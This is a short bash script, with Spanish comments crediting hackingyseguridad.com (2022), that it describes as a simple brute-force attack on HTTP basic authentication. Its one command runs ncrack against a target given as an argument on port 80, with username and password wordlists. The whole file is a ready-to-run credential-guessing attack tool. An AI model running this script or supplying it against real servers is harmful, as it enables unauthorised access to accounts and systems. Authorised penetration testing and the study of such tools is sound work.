#!/bin/bash
# Simple script de ataque fuerza bruta a http con autorizacion basica
# (c) hackingyseguridad.com 2022
ncrack -m http $1 -p 80 -U usuarios.txt -P claves.txt
